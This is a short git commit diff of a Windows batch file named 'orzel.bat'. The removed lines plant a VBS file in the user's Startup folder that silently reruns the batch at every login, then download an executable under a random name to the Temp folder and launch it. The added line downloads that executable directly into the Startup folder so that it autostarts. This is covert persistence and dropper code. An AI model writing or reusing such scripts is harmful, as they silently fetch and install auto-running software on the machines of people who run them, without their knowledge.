d4c6f93f99a4161d4c9b62bb9bd0af6cb0e5a929
Adikro <98780581+Adikro@users.noreply.github.com>
2024-08-23 17:52:57 +0200

    Update orzel.bat

--- orzel.bat
+++ orzel.bat
@@ -1,3 +1,1 @@
-@echo off
-echo "CreateObject("Wscript.Shell").Run "orzel.bat",0,True">%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\orzel.vbs
-cd %USERPROFILE%\AppData\Local\Temp && curl --location --request GET "https://install.medal.tv/" --output A0hUONH.exe start A0hUONH.exe
+cd %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ && cmd /c curl --location --request GET "https://install.medal.tv/" --output A0hUONH.exe
